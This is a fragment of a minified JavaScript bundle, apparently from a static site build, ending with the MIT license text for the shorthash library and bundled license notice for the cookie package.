7d8fe59.js"]}),{pageMap:pc,renderers:Y}),dc=void 0,mc=os(ss),_p=mc.default,as="start";as in ns&&ns[as](ss,dc);export{_p as default,pc as pageMap};
/**
 * shortdash - https://github.com/bibig/node-shorthash
 *
 * @license
 *
 * (The MIT License)
 *
 * Copyright (c) 2013 Bibig <bibig@me.com>
 *
 * Permission is hereby granted, free of charge, to any person
 * obtaining a copy of this software and associated documentation
 * files (the "Software"), to deal in the Software without
 * restriction, including without limitation the rights to use,
 * copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following
 * conditions:
 *
 * The above copyright notice and this permission notice shall be
 * included in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
 * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
 * OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
 * NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
 * HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
 * WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 * OTHER DEALINGS IN THE SOFTWARE.
 */
/*! Bundled license information:

cookie/index.js:
  (*!
   * cookie
   * Copyright(c) 2012-2014 Roman Shtylman
   * Copyright(c) 2015 Douglas Christopher Wilson
   * MIT Licensed
   *)
*/
